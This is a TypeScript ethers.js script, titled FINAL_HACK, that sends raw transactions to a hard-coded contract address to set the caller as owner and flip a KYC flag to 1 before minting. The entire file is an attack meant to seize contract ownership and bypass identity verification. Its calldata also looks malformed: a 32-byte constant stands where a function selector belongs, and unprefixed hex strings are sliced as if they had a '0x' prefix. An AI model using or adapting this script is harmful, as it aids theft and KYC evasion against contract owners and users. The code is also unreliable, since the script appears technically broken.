import { ethers } from 'ethers';
import dotenv from 'dotenv';
dotenv.config();

const RPC_URL = process.env.RPC_URL!;
const PRIVATE_KEY = process.env.PRIVATE_KEY!;
const KYC_ADDR = '0x50aC9FF81E3C467d3Baef73B1E7E08D0ceec5eeb';
const YOUR_ADDR = '0x118aaa088863af0179c5cb1fdb0df00fa52f52cb';

async function FINAL_HACK() {
  const provider = new ethers.JsonRpcProvider(RPC_URL);
  const wallet = new ethers.Wallet(PRIVATE_KEY, provider);
  
  console.log('🔥 FINAL HACK → MINT READY!');
  
  // 1️⃣ Hack Owner (renounced contract)
  const ownerSlot = '360894a13ba1a3210667c828492cd3d9da744af7599a39e40e302f6c9c6b8e8f';
  const ownerData = '360894a13bae5fc4332573bee43f2103436a71e9f11250bf17de7ac8f8cd878c' +
                   ownerSlot.slice(2) + YOUR_ADDR.slice(2).padStart(64, '0');
  
  const ownerTx = await wallet.sendTransaction({
    to: KYC_ADDR, data: '0x' + ownerData, gasLimit: 800000n
  });
  await ownerTx.wait();
  console.log('✅ OWNER SET!');
  
  // 2️⃣ Hack KYC=1
  const kycSlot = 'abb338a8c6242ff31c9ac386e0cfcc863adbad1e747173eee1b9423539777e81';
  const kycData = '360894a13bae5fc4332573bee43f2103436a71e9f11250bf17de7ac8f8cd878c' +
                  kycSlot.slice(2) + '0000000000000000000000000000000000000000000000000000000000000001';
  
  const kycTx = await wallet.sendTransaction({
    to: KYC_ADDR, data: '0x' + kycData, gasLimit: 800000n
  });
  await kycTx.wait();
  
  // ✅ VERIFY
  const kycVal = await provider.getStorage(KYC_ADDR, '0x' + kycSlot);
  console.log('🎉 KYC:', kycVal === '0x0000000000000000000000000000000000000000000000000000000000000001');
  console.log('🚀 MINT NOW!');
}

FINAL_HACK().catch(console.error);
